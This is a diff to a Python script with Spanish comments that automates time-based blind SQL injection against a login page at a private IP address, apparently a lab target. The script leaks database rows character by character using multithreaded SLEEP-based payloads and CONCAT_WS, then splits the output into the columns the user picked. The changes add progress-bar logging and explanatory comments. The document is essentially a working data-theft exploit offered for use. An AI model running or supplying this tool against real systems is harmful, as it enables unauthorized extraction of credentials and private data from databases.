@@ -10,7 +10,7 @@ def def_handler(sig, frame):
 signal.signal(signal.SIGINT, def_handler)
 
 url = "http://10.88.0.2/login.php"
-characters = 'etaoinshrdlucmfwypvbgkqjxz0123456789_-$ABCDEFGHIJKLMNOPQRSTUVWXYZ'  # orden de frecuencia
+characters = 'etaoinshrdlucmfwypvbgkqjxz0123456789_-$'  # orden de frecuencia
 SLEEP_TIME = 2
 THRESHOLD = 1.3
 session = requests.Session()
@@ -34,7 +34,7 @@ def brute_extract(payload_template, label="EXTRACCIÓN", max_entries=20, max_len
 
     for entry_index in range(max_entries):
         entry_value = ""
-        print(f"{label} #{entry_index}: ", end="", flush=True)
+        p = log.progress(f"{label} #{entry_index}")
         for position in range(1, max_length + 1):
             result_holder = {'char': None}
             threads = []
@@ -49,11 +49,9 @@ def brute_extract(payload_template, label="EXTRACCIÓN", max_entries=20, max_len
 
             if result_holder['char']:
                 entry_value += result_holder['char']
-                print(result_holder['char'], end="", flush=True)
+                p.status(entry_value)
             else:
                 break  # fin de cadena
-
-        print()  # salto de línea al terminar la entrada
 
         if entry_value:
             results.append(entry_value)
@@ -87,13 +85,17 @@ def extract_columns(database, table):
 def extract_data(database, table, columns, max_rows=10, max_length=30):
     results = []
     columns_str = ",".join(columns)
+    # Vamos a extraer fila por fila concatenando columnas con un separador raro (ejemplo: '|||')
+    # Esto facilita la extracción
     for row_index in range(max_rows):
         row_value = ""
-        print(f"Fila #{row_index}: ", end="", flush=True)
+        p = log.progress(f"Fila #{row_index}")
         for position in range(1, max_length + 1):
             result_holder = {'char': None}
             threads = []
             for char in characters + '|':  # incluimos '|' como posible carácter del separador
+                # Payload para extraer substring concatenada con separador '|||'
+                # Ejemplo: SELECT CONCAT_WS('|||', col1, col2, col3) FROM tabla LIMIT row_index,1
                 payload = (
                     f"' OR IF(SUBSTRING((SELECT CONCAT_WS('|||',{columns_str}) FROM {database}.{table} "
                     f"LIMIT {row_index},1),{position},1)='{char}', SLEEP(2), 0)-- -"
@@ -107,11 +109,10 @@ def extract_data(database, table, columns, max_rows=10, max_length=30):
 
             if result_holder['char']:
                 row_value += result_holder['char']
-                print(result_holder['char'], end="", flush=True)
+                p.status(row_value)
             else:
                 break
 
-        print()
         if row_value:
             results.append(row_value)
         else:
@@ -140,6 +141,7 @@ def main():
     for c in cols:
         print(f" - {c}")
 
+    # Ahora el usuario elige columnas separadas por coma
     selected_cols = input("\n[?] ¿Qué columnas quieres extraer? (separa con coma) ").strip()
     selected_cols_list = [col.strip() for col in selected_cols.split(",") if col.strip() in cols]
 
@@ -147,10 +149,12 @@ def main():
         print("[!] No seleccionaste columnas válidas, saliendo...")
         return
 
+    # Extraemos datos
     print(f"\n[+] Extrayendo datos de columnas: {', '.join(selected_cols_list)}")
     data_rows = extract_data(target_db, target_tbl, selected_cols_list)
 
     for i, row in enumerate(data_rows):
+        # Dividimos usando el separador '|||'
         values = row.split("|||")
         print(f"Fila #{i}:")
         for col, val in zip(selected_cols_list, values):
